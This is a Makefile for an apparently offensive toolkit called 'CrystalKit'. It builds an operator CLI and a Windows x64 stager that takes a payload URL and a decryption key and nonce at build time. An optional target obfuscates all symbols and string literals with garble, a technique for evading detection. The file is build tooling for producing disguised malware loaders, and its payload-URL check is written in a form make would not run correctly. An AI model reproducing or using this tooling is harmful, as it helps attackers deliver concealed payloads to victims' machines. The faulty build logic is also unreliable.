# CrystalKit Makefile
# Builds the operator CLI and (optionally) the Windows stager.

BINARY     := crystalkit
STAGER_EXE := build/stager.exe
GO         := go
GARBLE     := garble

# Detect garble
GARBLE_AVAILABLE := $(shell command -v $(GARBLE) 2>/dev/null)

.PHONY: all cli stager stager-garble clean help

all: cli

## cli: Build the operator CLI for the current platform
cli:
	$(GO) build -ldflags="-s -w" -o $(BINARY) ./cmd/crystalkit
	@echo "[+] $(BINARY) ready"

## stager: Cross-compile the Go stager for Windows x64 (plain go build)
stager:
	mkdir -p build
	ifndef PayloadURL
	$(error PayloadURL is required: make stager PayloadURL=https://... KeyHex=<hex> NonceHex=<hex>)
	endif
	GOOS=windows GOARCH=amd64 CGO_ENABLED=0 \
	  $(GO) build \
	    -ldflags="-s -w -X main.PayloadURL=$(PayloadURL) -X main.KeyHex=$(KeyHex) -X main.NonceHex=$(NonceHex)" \
	    -o $(STAGER_EXE) ./cmd/stager
	@echo "[+] $(STAGER_EXE) ready"

## stager-garble: Cross-compile the stager with garble (obfuscates all symbols + strings)
stager-garble:
ifdef GARBLE_AVAILABLE
	mkdir -p build
	GOOS=windows GOARCH=amd64 CGO_ENABLED=0 \
	  $(GARBLE) -literals build \
	    -ldflags="-s -w -X main.PayloadURL=$(PayloadURL) -X main.KeyHex=$(KeyHex) -X main.NonceHex=$(NonceHex)" \
	    -o $(STAGER_EXE) ./cmd/stager
	@echo "[+] $(STAGER_EXE) ready (garble obfuscated)"
else
	@echo "[!] garble not found — run: go install mvdan.cc/garble@latest"
	@exit 1
endif

## clean: Remove build artefacts
clean:
	rm -rf build/ $(BINARY)

## help: Show this help
help:
	@grep -E '^## ' Makefile | sed 's/## /  /'
